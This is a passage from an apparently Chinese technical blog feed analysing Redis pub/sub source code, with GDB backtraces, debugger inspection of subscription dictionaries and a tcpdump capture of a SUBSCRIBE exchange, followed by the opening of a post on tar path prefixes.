2、调用read()读套接字, 发现返回值ret为0，从而感知到对端已关闭连接。</span></span><br><span class="line">(gdb) n</span><br><span class="line">	<span class="title function_">if</span> <span class="params">(!ret)</span> &#123;</span><br><span class="line">(gdb) p ret</span><br><span class="line">$<span class="number">2</span> = <span class="number">0</span></span><br></pre></td></tr></table></figure>

<ul>
<li>2、<code>readQueryFromClient</code>中，<font color = 'red'>调用read()读客户端套接字，发现返回值为0，从而感知到对端已关闭连接</font>，再调用函数<code>freeClientAsync</code>，异步地关闭这个客户端。<code>freeClientAsync</code>源码参考：</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">freeClientAsync</span><span class="params">(client *c)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (c-&gt;flags &amp; CLIENT_CLOSE_ASAP || c-&gt;flags &amp; CLIENT_LUA) <span class="keyword">return</span>;</span><br><span class="line">    c-&gt;flags |= CLIENT_CLOSE_ASAP;</span><br><span class="line">    <span class="keyword">if</span> (server.io_threads_num == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="comment">/* no need to bother with locking if there&#x27;s just one thread (the main thread) */</span></span><br><span class="line">        listAddNodeTail(server.clients_to_close,c);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">static</span> <span class="type">pthread_mutex_t</span> async_free_queue_mutex = PTHREAD_MUTEX_INITIALIZER;</span><br><span class="line">    pthread_mutex_lock(&amp;async_free_queue_mutex);</span><br><span class="line">    listAddNodeTail(server.clients_to_close,c);</span><br><span class="line">    pthread_mutex_unlock(&amp;async_free_queue_mutex);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看出，<code>freeClientAsync</code>的实现很简单，只是把这个客户端加入服务器链表<code>clients_to_close</code>， 并不立即释放这个客户端，所以说是<strong>异步</strong>地关闭。</p>
<ul>
<li>3、在下一次事件循环中，调用<code>freeClientsInAsyncFreeQueue</code>从服务器链表<code>clients_to_close</code>取出待释放的客户端；再调用<code>freeClient</code>真正地释放这个客户端，<font color = 'red'>接着调用<code>pubsubUnsubscribeAllChannels</code>保证这个客户端的频道和模式订阅信息被同步删除</font>。调用链：<code>aeMain -&gt; aeProcessEvents -&gt;  beforeSleep -&gt; freeClientsInAsyncFreeQueue -&gt; freeClient</code>, 调用栈参考如下：</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">(gdb) bt</span><br><span class="line">#<span class="number">0</span>  dictGenericDelete (d=<span class="number">0x7fcbeae0d2e0</span>, key=key@entry=<span class="number">0x7fcbeae0e360</span>, nofree=nofree@entry=<span class="number">0</span>) at dict.c:<span class="number">393</span></span><br><span class="line">#<span class="number">1</span>  <span class="number">0x0000560411944bdf</span> in <span class="title function_">dictDelete</span> <span class="params">(ht=&lt;optimized out&gt;, key=key@entry=<span class="number">0x7fcbeae0e360</span>)</span> at dict.c:406</span><br><span class="line">#2  0x000056041198e2bf in <span class="title function_">pubsubUnsubscribeChannel</span> <span class="params">(c=c@entry=<span class="number">0x7fcbeaf4d700</span>, channel=<span class="number">0x7fcbeae0e360</span>, notify=notify@entry=<span class="number">0</span>)</span> at pubsub.c:198</span><br><span class="line">#3  0x000056041198e5bd in <span class="title function_">pubsubUnsubscribeAllChannels</span> <span class="params">(c=c@entry=<span class="number">0x7fcbeaf4d700</span>, notify=notify@entry=<span class="number">0</span>)</span> at pubsub.c:284</span><br><span class="line">#4  0x0000560411957cf7 in <span class="title function_">freeClient</span> <span class="params">(c=<span class="number">0x7fcbeaf4d700</span>)</span> at networking.c:1251</span><br><span class="line">#5  0x00005604119584fd in <span class="title function_">freeClientsInAsyncFreeQueue</span> <span class="params">()</span> at networking.c:1345</span><br><span class="line">#6  0x000056041194634b in <span class="title function_">beforeSleep</span> <span class="params">(eventLoop=&lt;optimized out&gt;)</span> at server.c:2204</span><br><span class="line">#7  <span class="title function_">beforeSleep</span> <span class="params">(eventLoop=&lt;optimized out&gt;)</span> at server.c:2117</span><br><span class="line">#8  0x00005604119425e8 in <span class="title function_">aeProcessEvents</span> <span class="params">(eventLoop=eventLoop@entry=<span class="number">0x7fcbeae0b480</span>, flags=flags@entry=<span class="number">27</span>)</span> at ae.c:443</span><br><span class="line">#9  0x0000560411942a5d in <span class="title function_">aeMain</span> <span class="params">(eventLoop=<span class="number">0x7fcbeae0b480</span>)</span> at ae.c:539</span><br><span class="line">#10 0x000056041193eed8 in <span class="title function_">main</span> <span class="params">(argc=&lt;optimized out&gt;, argv=<span class="number">0x7ffc77472d58</span>)</span> at server.c:5498</span><br></pre></td></tr></table></figure>

<p><code>freeClientsInAsyncFreeQueue</code>的源码实现参考如下，逻辑很简单，就是从服务器链表<code>client_to_close</code>中依次取出并释放所有的客户端。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">freeClientsInAsyncFreeQueue</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="type">int</span> freed = <span class="number">0</span>;</span><br><span class="line">    listIter li;</span><br><span class="line">    listNode *ln;</span><br><span class="line"></span><br><span class="line">    listRewind(server.clients_to_close,&amp;li);	<span class="comment">// 从clients_to_close链表中依次取出所有客户端，并释放这个客户端。</span></span><br><span class="line">    <span class="keyword">while</span> ((ln = listNext(&amp;li)) != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        client *c = listNodeValue(ln);</span><br><span class="line">        <span class="keyword">if</span> (c-&gt;flags &amp; CLIENT_PROTECTED) <span class="keyword">continue</span>;</span><br><span class="line">        c-&gt;flags &amp;= ~CLIENT_CLOSE_ASAP;</span><br><span class="line">        freeClient(c);</span><br><span class="line">        listDelNode(server.clients_to_close,ln);</span><br><span class="line">        freed++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> freed;	<span class="comment">// 返回释放的客户端总数</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="服务器正常关闭场景，正在订阅的客户端是怎么感知到服务器离线的？"><a href="#服务器正常关闭场景，正在订阅的客户端是怎么感知到服务器离线的？" class="headerlink" title="服务器正常关闭场景，正在订阅的客户端是怎么感知到服务器离线的？"></a>服务器正常关闭场景，正在订阅的客户端是怎么感知到服务器离线的？<span id="jump9"></span></h4><p>这里仅讨论服务器正常关闭的场景，即客户端发送SHUTDOWN命令关闭服务端。此时服务端将执行如下操作：</p>
<ul>
<li>1、接受客户端的SHUTDOWN命令，调用函数<code>shutdownCommand</code>处理这个关闭请求。调用链<code>aeMain -&gt; processInputBuffer -&gt; shutdownCommand </code>，调用栈如下：</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">(gdb) bt</span><br><span class="line">#<span class="number">0</span>  closeListeningSockets (unlink_unix_socket=<span class="number">1</span>) at server.c:<span class="number">3809</span></span><br><span class="line">#<span class="number">1</span>  <span class="number">0x0000562ee4b31992</span> in <span class="title function_">prepareForShutdown</span> <span class="params">(flags=&lt;optimized out&gt;, flags@entry=<span class="number">0</span>)</span> at server.c:3916</span><br><span class="line">#2  0x0000562ee4b4bbdb in <span class="title function_">shutdownCommand</span> <span class="params">(c=<span class="number">0x7ff3c594dd80</span>)</span> at db.c:1061</span><br><span class="line">#3  0x0000562ee4b30701 in <span class="title function_">call</span> <span class="params">(c=<span class="number">0x7ff3c594dd80</span>, flags=<span class="number">15</span>)</span> at server.c:3368</span><br><span class="line">#4  0x0000562ee4b311c6 in <span class="title function_">processCommand</span> <span class="params">(c=c@entry=<span class="number">0x7ff3c594dd80</span>)</span> at server.c:3797</span><br><span class="line">#5  0x0000562ee4b3fca4 in <span class="title function_">processCommandAndResetClient</span> <span class="params">(c=c@entry=<span class="number">0x7ff3c594dd80</span>)</span> at networking.c:1895</span><br><span class="line">#6  0x0000562ee4b448fa in <span class="title function_">processInputBuffer</span> <span class="params">(c=<span class="number">0x7ff3c594dd80</span>)</span> at networking.c:1978</span><br><span class="line">#7  0x0000562ee4bcae3c in <span class="title function_">callHandler</span> <span class="params">(handler=&lt;optimized out&gt;, conn=<span class="number">0x7ff3c58150c0</span>)</span> at connhelpers.h:79</span><br><span class="line">#8  <span class="title function_">connSocketEventHandler</span> <span class="params">(el=&lt;optimized out&gt;, fd=&lt;optimized out&gt;, clientData=<span class="number">0x7ff3c58150c0</span>, mask=&lt;optimized out&gt;)</span> at connection.c:296</span><br><span class="line">#9  0x0000562ee4b29723 in <span class="title function_">aeProcessEvents</span> <span class="params">(eventLoop=eventLoop@entry=<span class="number">0x7ff3c580b480</span>, flags=flags@entry=<span class="number">27</span>)</span> at ae.c:479</span><br><span class="line">#10 0x0000562ee4b29a5d in <span class="title function_">aeMain</span> <span class="params">(eventLoop=<span class="number">0x7ff3c580b480</span>)</span> at ae.c:539</span><br><span class="line">#11 0x0000562ee4b25ed8 in <span class="title function_">main</span> <span class="params">(argc=&lt;optimized out&gt;, argv=<span class="number">0x7ffe9a269bf8</span>)</span> at server.c:5498</span><br></pre></td></tr></table></figure>

<ul>
<li>2、接着调用<code>closeListeningSockets</code>关闭listen套接字，之后再调用<code>exit</code>退出服务器程序。源码参考如下：</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">closeListeningSockets</span><span class="params">(<span class="type">int</span> unlink_unix_socket)</span> &#123;</span><br><span class="line">    <span class="type">int</span> j;</span><br><span class="line">    <span class="comment">// 调用close(), 关闭服务端的listen套接字</span></span><br><span class="line">    <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; server.ipfd_count; j++) close(server.ipfd[j]);</span><br><span class="line">    <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; server.tlsfd_count; j++) close(server.tlsfd[j]);</span><br><span class="line">    <span class="keyword">if</span> (server.sofd != <span class="number">-1</span>) close(server.sofd);</span><br><span class="line">    <span class="keyword">if</span> (server.cluster_enabled)</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; server.cfd_count; j++) close(server.cfd[j]);</span><br><span class="line">    <span class="keyword">if</span> (unlink_unix_socket &amp;&amp; server.unixsocket) &#123;</span><br><span class="line">        serverLog(LL_NOTICE,<span class="string">&quot;Removing the unix socket file.&quot;</span>);</span><br><span class="line">        unlink(server.unixsocket); <span class="comment">/* don&#x27;t care if this fails */</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>3、客户端通过死循环调用<code>redisGetReply</code>获取订阅信息，而<code>redisGetReply</code>最终是通过系统调用<code>recv</code>读取套接字数据，<font color = 'red'>当服务器调用exit退出后，客户端的<code>recv</code>调用会返回0，从而感知到服务器离线，</font>最终调用<code>exit</code>退出客户端程序。调用栈参考：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(gdb) bt</span><br><span class="line">#0  0x00007ffff7e5d5b0 in __libc_recv (fd=3, buf=0x7fffffffa200, len=16384, flags=flags@entry=0) at ../sysdeps/unix/sysv/linux/recv.c:28</span><br><span class="line">#1  0x000055555558ec0b in recv (__flags=0, __n=&lt;optimized out&gt;, __buf=&lt;optimized out&gt;, __fd=&lt;optimized out&gt;)</span><br><span class="line">    at /usr/include/x86_64-linux-gnu/bits/socket2.h:44</span><br><span class="line">#2  redisNetRead (c=0x555555841300, buf=&lt;optimized out&gt;, bufcap=&lt;optimized out&gt;) at net.c:61</span><br><span class="line">#3  0x0000555555587702 in redisBufferRead (c=0x555555841300) at hiredis.c:881</span><br><span class="line">#4  0x0000555555587a92 in redisGetReply (c=0x555555841300, reply=0x7fffffffe280) at hiredis.c:954</span><br><span class="line">#5  0x000055555557fadd in cliReadReply (output_raw_strings=0) at redis-cli.c:1204</span><br><span class="line">#6  0x0000555555581e0d in cliSendCommand (argc=2, argv=0x7ffff780a000, repeat=0) at redis-cli.c:1361</span><br><span class="line">#7  0x0000555555582006 in issueCommandRepeat (argc=2, argv=0x7ffff780a000, repeat=1) at redis-cli.c:1858</span><br><span class="line">#8  0x000055555556dd8d in issueCommand (argv=0x7ffff780a000, argc=&lt;optimized out&gt;) at redis-cli.c:2090</span><br><span class="line">#9  noninteractive (argv=0x7ffff780a000, argc=&lt;optimized out&gt;) at redis-cli.c:2090</span><br><span class="line">#10 main (argc=&lt;optimized out&gt;, argv=&lt;optimized out&gt;) at redis-cli.c:8251</span><br></pre></td></tr></table></figure>



<h3 id="调试方法参考"><a href="#调试方法参考" class="headerlink" title="调试方法参考"></a>调试方法参考</h3><h4 id="1、频道订阅场景，用GDB打印字典pubsub-channels-的方法参考如下："><a href="#1、频道订阅场景，用GDB打印字典pubsub-channels-的方法参考如下：" class="headerlink" title="1、频道订阅场景，用GDB打印字典pubsub_channels 的方法参考如下："></a>1、频道订阅场景，用GDB打印字典<code>pubsub_channels</code> 的方法参考如下：<span id="jumpx"></span></h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 1、打印pubsub_channels字典</span></span><br><span class="line">(gdb) p *(server.pubsub_channels)</span><br><span class="line">$<span class="number">1</span> = &#123;</span><br><span class="line">  type = <span class="number">0x557a48da1160</span> &lt;keylistDictType&gt;,</span><br><span class="line">  privdata = <span class="number">0x0</span>,</span><br><span class="line">  ht = &#123;&#123;</span><br><span class="line">      table = <span class="number">0x7f4f0bc0e3a0</span>,</span><br><span class="line">      size = <span class="number">4</span>,</span><br><span class="line">      sizemask = <span class="number">3</span>,</span><br><span class="line">      used = <span class="number">2</span>				<span class="comment">// channel频道总数为2</span></span><br><span class="line">    &#125;, &#123;</span><br><span class="line">      table = <span class="number">0x0</span>,</span><br><span class="line">      size = <span class="number">0</span>,</span><br><span class="line">      sizemask = <span class="number">0</span>,</span><br><span class="line">      used = <span class="number">0</span></span><br><span class="line">    &#125;&#125;,</span><br><span class="line">  rehashidx = <span class="number">-1</span>,</span><br><span class="line">  iterators = <span class="number">0</span></span><br><span class="line">&#125;</span><br><span class="line">(gdb) p server.pubsub_channels.ht[<span class="number">0</span>].table[<span class="number">0</span>]</span><br><span class="line">$<span class="number">2</span> = (dictEntry *) <span class="number">0x0</span></span><br><span class="line">(gdb) p server.pubsub_channels.ht[<span class="number">0</span>].table[<span class="number">1</span>]</span><br><span class="line">$<span class="number">3</span> = (dictEntry *) <span class="number">0x7f4f0bc4b728</span></span><br><span class="line">(gdb) p server.pubsub_channels.ht[<span class="number">0</span>].table[<span class="number">2</span>]</span><br><span class="line">$<span class="number">4</span> = (dictEntry *) <span class="number">0x7f4f0bc4b7d0</span></span><br><span class="line">(gdb) p server.pubsub_channels.ht[<span class="number">0</span>].table[<span class="number">3</span>]</span><br><span class="line">$<span class="number">5</span> = (dictEntry *) <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 1.1 打印所有的channel，此例中channel个数为2，分别是channel1, channel2</span></span><br><span class="line">(gdb) p (<span class="type">char</span> *)((robj *)(server.pubsub_channels.ht[<span class="number">0</span>].table[<span class="number">1</span>].key)).ptr</span><br><span class="line">$<span class="number">6</span> = <span class="number">0x7f4f0bc0e373</span> <span class="string">&quot;channel1&quot;</span></span><br><span class="line">(gdb) p (<span class="type">char</span> *)((robj *)(server.pubsub_channels.ht[<span class="number">0</span>].table[<span class="number">2</span>].key)).ptr</span><br><span class="line">$<span class="number">7</span> = <span class="number">0x7f4f0bc0e433</span> <span class="string">&quot;channel2&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 2、打印每个channel对应的客户端链表</span></span><br><span class="line">(gdb) p (<span class="built_in">list</span> *)server.pubsub_channels.ht[<span class="number">0</span>].table[<span class="number">1</span>].v.val</span><br><span class="line">$<span class="number">8</span> = (<span class="built_in">list</span> *) <span class="number">0x7f4f0bc0fa20</span></span><br><span class="line"><span class="comment">// 2.1 链表长度为2，表示有2个客户端正在订阅channel1频道</span></span><br><span class="line">(gdb) p *(<span class="built_in">list</span> *)server.pubsub_channels.ht[<span class="number">0</span>].table[<span class="number">1</span>].v.val</span><br><span class="line">$<span class="number">9</span> = &#123;</span><br><span class="line">  head = <span class="number">0x7f4f0bc4b740</span>,</span><br><span class="line">  tail = <span class="number">0x7f4f0bc4b7a0</span>,</span><br><span class="line">  dup = <span class="number">0x0</span>,</span><br><span class="line">  <span class="built_in">free</span> = <span class="number">0x0</span>,</span><br><span class="line">  match = <span class="number">0x0</span>,</span><br><span class="line">  len = <span class="number">2</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 2.2 链表长度为2，表示有2个客户端正在订阅channel2频道</span></span><br><span class="line">(gdb) p *(<span class="built_in">list</span> *)server.pubsub_channels.ht[<span class="number">0</span>].table[<span class="number">2</span>].v.val</span><br><span class="line">$<span class="number">10</span> = &#123;</span><br><span class="line">  head = <span class="number">0x7f4f0bc4b7e8</span>,</span><br><span class="line">  tail = <span class="number">0x7f4f0bc4b830</span>,</span><br><span class="line">  dup = <span class="number">0x0</span>,</span><br><span class="line">  <span class="built_in">free</span> = <span class="number">0x0</span>,</span><br><span class="line">  match = <span class="number">0x0</span>,</span><br><span class="line">  len = <span class="number">2</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="2、模式订阅场景，用GDB打印模式链表pubsub-patterns和模式字典pubsub-patterns-dict的方法参考如下："><a href="#2、模式订阅场景，用GDB打印模式链表pubsub-patterns和模式字典pubsub-patterns-dict的方法参考如下：" class="headerlink" title="2、模式订阅场景，用GDB打印模式链表pubsub_patterns和模式字典pubsub_patterns_dict的方法参考如下： "></a>2、模式订阅场景，用GDB打印模式链表<code>pubsub_patterns</code>和模式字典<code>pubsub_patterns_dict</code>的方法参考如下： <span id="jumpy"></span></h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 打印模式链表pubsub_patterns</span></span><br><span class="line">p *(server.pubsub_patterns)</span><br><span class="line">$<span class="number">3</span> = &#123;head = <span class="number">0x7f499144b740</span>, tail = <span class="number">0x7f499144b7d0</span>, dup = <span class="number">0x0</span>, <span class="built_in">free</span> = <span class="number">0x55c68a57c110</span> &lt;freePubsubPattern&gt;,</span><br><span class="line">  match = <span class="number">0x55c68a57c130</span> &lt;listMatchPubsubPattern&gt;, len = <span class="number">4</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 链表长度为4</span></span><br><span class="line">(gdb) p (sds)(robj *)(((<span class="keyword">struct</span> pubsubPattern *)server.pubsub_patterns-&gt;head-&gt;value)-&gt;pattern)-&gt;ptr</span><br><span class="line">$<span class="number">12</span> = (sds) <span class="number">0x7f499140e353</span> <span class="string">&quot;pat1*&quot;</span></span><br><span class="line">(gdb) p (sds)(robj *)(((<span class="keyword">struct</span> pubsubPattern *)server.pubsub_patterns-&gt;head-&gt;next-&gt;value)-&gt;pattern)-&gt;ptr</span><br><span class="line">$<span class="number">13</span> = (sds) <span class="number">0x7f499140e3b3</span> <span class="string">&quot;pat2*&quot;</span></span><br><span class="line">(gdb) p (sds)(robj *)(((<span class="keyword">struct</span> pubsubPattern *)server.pubsub_patterns-&gt;head-&gt;next-&gt;next-&gt;value)-&gt;pattern)-&gt;ptr</span><br><span class="line">$<span class="number">14</span> = (sds) <span class="number">0x7f499140e3d3</span> <span class="string">&quot;pat3*&quot;</span></span><br><span class="line">(gdb) p (sds)(robj *)(((<span class="keyword">struct</span> pubsubPattern *)server.pubsub_patterns-&gt;head-&gt;next-&gt;next-&gt;next-&gt;value)-&gt;pattern)-&gt;ptr</span><br><span class="line">$<span class="number">15</span> = (sds) <span class="number">0x7f499140e413</span> <span class="string">&quot;pat3*&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 打印模式字典</span></span><br><span class="line">(gdb) p *server.pubsub_patterns_dict</span><br><span class="line">$<span class="number">16</span> = &#123;type = <span class="number">0x55c68a6ce160</span> &lt;keylistDictType&gt;, privdata = <span class="number">0x0</span>, ht = &#123;&#123;table = <span class="number">0x7f499140e380</span>, size = <span class="number">4</span>, sizemask = <span class="number">3</span>,</span><br><span class="line">      used = <span class="number">3</span>&#125;, &#123;table = <span class="number">0x0</span>, size = <span class="number">0</span>, sizemask = <span class="number">0</span>, used = <span class="number">0</span>&#125;&#125;, rehashidx = <span class="number">-1</span>, iterators = <span class="number">0</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 字典有3个key</span></span><br><span class="line">p (sds)((robj *)server.pubsub_patterns_dict-&gt;ht[<span class="number">0</span>].table[<span class="number">1</span>]-&gt;key)-&gt;ptr</span><br><span class="line">$<span class="number">27</span> = (sds) <span class="number">0x7f499140e353</span> <span class="string">&quot;pat1*&quot;</span></span><br><span class="line">(gdb) p (sds)((robj *)server.pubsub_patterns_dict-&gt;ht[<span class="number">0</span>].table[<span class="number">3</span>]-&gt;key)-&gt;ptr</span><br><span class="line">$<span class="number">28</span> = (sds) <span class="number">0x7f499140e3d3</span> <span class="string">&quot;pat3*&quot;</span></span><br><span class="line">(gdb) p (sds)((robj *)server.pubsub_patterns_dict-&gt;ht[<span class="number">0</span>].table[<span class="number">3</span>]-&gt;next-&gt;key)-&gt;ptr</span><br><span class="line">$<span class="number">29</span> = (sds) <span class="number">0x7f499140e3b3</span> <span class="string">&quot;pat2*&quot;</span></span><br></pre></td></tr></table></figure>

<h4 id="3、通过tcpdump抓包，分析一次订阅中的连接建立、请求消息的过程"><a href="#3、通过tcpdump抓包，分析一次订阅中的连接建立、请求消息的过程" class="headerlink" title="3、通过tcpdump抓包，分析一次订阅中的连接建立、请求消息的过程 "></a>3、通过tcpdump抓包，分析一次订阅中的连接建立、请求消息的过程 <span id="jumpz"></span></h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">tcpdump tcp port 6379 -X -i lo</span></span><br><span class="line">tcpdump: verbose output suppressed, use -v or -vv for full protocol decode</span><br><span class="line">listening on lo, link-type EN10MB (Ethernet), capture size 262144 bytes</span><br><span class="line">三次握手</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">SYN</span></span><br><span class="line">15:36:47.497450 IP localhost.50208 &gt; localhost.6379: Flags [S], seq 3233936820, win 65495, options [mss 65495,sackOK,TS val 3705662768 ecr 0,nop,wscale 7], length 0</span><br><span class="line">        0x0000:  4500 003c 84bd 4000 4006 b7fc 7f00 0001  E..&lt;..@.@.......</span><br><span class="line">        0x0010:  7f00 0001 c420 18eb c0c1 f5b4 0000 0000  ................</span><br><span class="line">        0x0020:  a002 ffd7 fe30 0000 0204 ffd7 0402 080a  .....0..........</span><br><span class="line">        0x0030:  dcdf ed30 0000 0000 0103 0307            ...0........</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">SYN + ACK</span></span><br><span class="line">15:36:47.497456 IP localhost.6379 &gt; localhost.50208: Flags [S.], seq 4118461797, ack 3233936821, win 65483, options [mss 65495,sackOK,TS val 3705662768 ecr 3705662768,nop,wscale 7], length 0</span><br><span class="line">        0x0000:  4500 003c 0000 4000 4006 3cba 7f00 0001  E..&lt;..@.@.&lt;.....</span><br><span class="line">        0x0010:  7f00 0001 18eb c420 f57a bd65 c0c1 f5b5  .........z.e....</span><br><span class="line">        0x0020:  a012 ffcb fe30 0000 0204 ffd7 0402 080a  .....0..........</span><br><span class="line">        0x0030:  dcdf ed30 dcdf ed30 0103 0307            ...0...0....</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">ACK</span></span><br><span class="line">15:36:47.497462 IP localhost.50208 &gt; localhost.6379: Flags [.], ack 1, win 512, options [nop,nop,TS val 3705662768 ecr 3705662768], length 0</span><br><span class="line">        0x0000:  4500 0034 84be 4000 4006 b803 7f00 0001  E..4..@.@.......</span><br><span class="line">        0x0010:  7f00 0001 c420 18eb c0c1 f5b5 f57a bd66  .............z.f</span><br><span class="line">        0x0020:  8010 0200 fe28 0000 0101 080a dcdf ed30  .....(.........0</span><br><span class="line">        0x0030:  dcdf ed30                                ...0</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">三次握手结束，订阅的长连接建立</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">客户端发送请求：<span class="string">&quot;subscribe channel1&quot;</span>，采用RESP协议</span></span><br><span class="line">15:36:47.498719 IP localhost.50208 &gt; localhost.6379: Flags [P.], seq 1:34, ack 1, win 512, options [nop,nop,TS val 3705662770 ecr 3705662768], length 33: RESP &quot;subscribe&quot; &quot;channel1&quot;</span><br><span class="line">        0x0000:  4500 0055 84bf 4000 4006 b7e1 7f00 0001  E..U..@.@.......</span><br><span class="line">        0x0010:  7f00 0001 c420 18eb c0c1 f5b5 f57a bd66  .............z.f</span><br><span class="line">        0x0020:  8018 0200 fe49 0000 0101 080a dcdf ed32  .....I.........2</span><br><span class="line">        0x0030:  dcdf ed30 2a32 0d0a 2439 0d0a 7375 6273  ...0*2..$9..subs</span><br><span class="line">        0x0040:  6372 6962 650d 0a24 380d 0a63 6861 6e6e  cribe..$8..chann</span><br><span class="line">        0x0050:  656c 310d 0a                             el1..</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">服务端的ACK</span></span><br><span class="line">15:36:47.498725 IP localhost.6379 &gt; localhost.50208: Flags [.], ack 34, win 512, options [nop,nop,TS val 3705662770 ecr 3705662770], length 0</span><br><span class="line">        0x0000:  4500 0034 d240 4000 4006 6a81 7f00 0001  E..4.@@.@.j.....</span><br><span class="line">        0x0010:  7f00 0001 18eb c420 f57a bd66 c0c1 f5d6  .........z.f....</span><br><span class="line">        0x0020:  8010 0200 fe28 0000 0101 080a dcdf ed32  .....(.........2</span><br><span class="line">        0x0030:  dcdf ed32                                ...2</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">服务端回复请求：<span class="string">&quot;subscribe channel1 1&quot;</span>，采用RESP协议</span></span><br><span class="line">15:36:47.498803 IP localhost.6379 &gt; localhost.50208: Flags [P.], seq 1:38, ack 34, win 512, options [nop,nop,TS val 3705662770 ecr 3705662770], length 37: RESP &quot;subscribe&quot; &quot;channel1&quot; &quot;1&quot;</span><br><span class="line">        0x0000:  4500 0059 d241 4000 4006 6a5b 7f00 0001  E..Y.A@.@.j[....</span><br><span class="line">        0x0010:  7f00 0001 18eb c420 f57a bd66 c0c1 f5d6  .........z.f....</span><br><span class="line">        0x0020:  8018 0200 fe4d 0000 0101 080a dcdf ed32  .....M.........2</span><br><span class="line">        0x0030:  dcdf ed32 2a33 0d0a 2439 0d0a 7375 6273  ...2*3..$9..subs</span><br><span class="line">        0x0040:  6372 6962 650d 0a24 380d 0a63 6861 6e6e  cribe..$8..chann</span><br><span class="line">        0x0050:  656c 310d 0a3a 310d 0a                   el1..:1..</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">客户端的ACK</span></span><br><span class="line">15:36:47.499058 IP localhost.50208 &gt; localhost.6379: Flags [.], ack 38, win 512, options [nop,nop,TS val 3705662770 ecr 3705662770], length 0</span><br><span class="line">        0x0000:  4500 0034 84c0 4000 4006 b801 7f00 0001  E..4..@.@.......</span><br><span class="line">        0x0010:  7f00 0001 c420 18eb c0c1 f5d6 f57a bd8b  .............z..</span><br><span class="line">        0x0020:  8010 0200 fe28 0000 0101 080a dcdf ed32  .....(.........2</span><br><span class="line">        0x0030:  dcdf ed32</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">以下省略客户端循环接受频道消息，四次挥手释放连接的过程......</span></span><br></pre></td></tr></table></figure>

<h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p>【1】《Redis设计与实现》第18章 发布与订阅 —— 黄健宏</p>
<p>【2】<a href="https://www.cnblogs.com/yougewe/p/12349899.html">Redis（十）：pub&#x2F;sub 发布订阅源码解析</a></p>
<p>【3】<a href="https://blog.huangz.me/diary/2013/redis-pubsub-glob-pattern-example.html">Redis 发布与订阅模式匹配符示例</a></p>
<p>【4】<a href="https://www.runoob.com/redis/redis-pub-sub.html">菜鸟教程 Redis 发布订阅</a></p>
<p>【5】<a href="https://redis.io/topics/protocol">Redis协议规范（RESP）</a></p>
]]></content>
      <categories>
        <category>Redis</category>
      </categories>
      <tags>
        <tag>Redis</tag>
      </tags>
  </entry>
  <entry>
    <title>tar打包时去掉目录前缀的方法</title>
    <url>/2022/06/04/2022-06-04-use-tar-to-remove-dir-prefix/</url>
    <content><![CDATA[<h2 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h2><p>tar命令打包时，默认会带上文件路径，举例如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">tree</span></span><br><span class="line">.</span><br><span class="line">├── dir1</span><br><span class="line">│   └── file1.txt</span><br><span class="line">└── dir2</span><br><span class="line">    ├── dir3</span><br><span class="line">    │   └── file3.txt</span><br><span class="line">    └── file2.txt</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">tar zcf hello.tar.gz ./*</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">tar tvf hello.tar.gz</span></span><br><span class="line">drwxr-xr-x root/root         0 2022-06-03 23:20 ./dir1/</span><br><span class="line">-rw-r--r-- root/root         0 2022-06-03 23:20 ./dir1/file1.txt</span><br><span class="line">drwxr-xr-x root/root         0 2022-06-03 23:30 ./dir2/</span><br><span class="line">-rw-r--r-- root/root         0 2022-06-03 23:20 ./dir2/file2.txt</span><br><span class="line">drwxr-xr-x root/root         0 2022-06-03 23:30 ./dir2/dir3/</span><br><span class="line">-rw-r--r-- root/root         0 2022-06-03 23:30 ./dir2/dir3/file3.txt</span><br></pre></td></tr></table></figure>
